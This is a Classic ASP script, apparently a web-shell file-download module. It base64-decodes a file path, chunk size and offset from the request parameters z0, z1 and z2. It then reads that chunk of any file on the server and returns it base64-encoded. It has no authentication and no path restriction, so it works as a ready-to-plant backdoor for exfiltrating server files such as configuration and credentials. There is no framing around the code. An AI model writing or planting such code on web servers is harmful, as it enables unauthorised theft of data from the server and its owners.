<%

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    ' If Response.CharSet is empty, map it based on Session.CodePage
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8" ' Default safe fallback
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    Dim xml, node, stream

    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()

    Base64Decode = stream.ReadText

    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function fnBase64Encode(binaryData)
    Dim xml, node
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    
    node.DataType = "bin.base64"
    node.NodeTypedValue = binaryData
    fnBase64Encode = Replace(node.text, vbLf, "")
    
    Set node = Nothing
    Set xml = Nothing
End Function

' Control flow flag to replace destructive Response.End calls
Dim runClassicModule
runClassicModule = true

' Direct parameter presence validation
If Request("z0") = "" Or Request("z1") = "" Or Request("z2") = "" Then
    Response.Write "0|missing parameters"
    runClassicModule = false
End If

If runClassicModule Then
    Dim szPath, szChunkSize, szOffset
    Dim nChunkSize, nOffset, nFileSize

    ' Decode raw inputs safely using your updated Base64Decode function
    szPath = Base64Decode(Request("z0"))
    szChunkSize = Base64Decode(Request("z1"))
    szOffset = Base64Decode(Request("z2"))

    If IsNumeric(szChunkSize) Then nChunkSize = CLng(szChunkSize) Else nChunkSize = 0
    If IsNumeric(szOffset) Then nOffset = CLng(szOffset) Else nOffset = 0

    Dim fso, file
    Set fso = Server.CreateObject("Scripting.FileSystemObject")

    If Not fso.FileExists(szPath) Then
        Response.Write "0|ERROR://file not exists"
        runClassicModule = false
    End If

    If runClassicModule Then
        Set file = fso.GetFile(szPath)
        nFileSize = file.Size

        If nOffset >= nFileSize Then
            Response.Write "2|"
            runClassicModule = false
        End If

        If runClassicModule Then
            Dim chunkStream
            Set chunkStream = Server.CreateObject("ADODB.Stream")

            chunkStream.Type = 1 ' Binary
            chunkStream.Open
            chunkStream.LoadFromFile szPath

            chunkStream.Position = nOffset

            Dim remaining, readSize
            remaining = nFileSize - nOffset

            If nChunkSize > remaining Then
                readSize = remaining
            Else
                readSize = nChunkSize
            End If

            Dim data
            data = chunkStream.Read(readSize)

            chunkStream.Close
            Set chunkStream = Nothing

            Response.Write "1|" & fnBase64Encode(data)
        End If
    End If
    
    Set file = Nothing
    Set fso = Nothing
End If

%>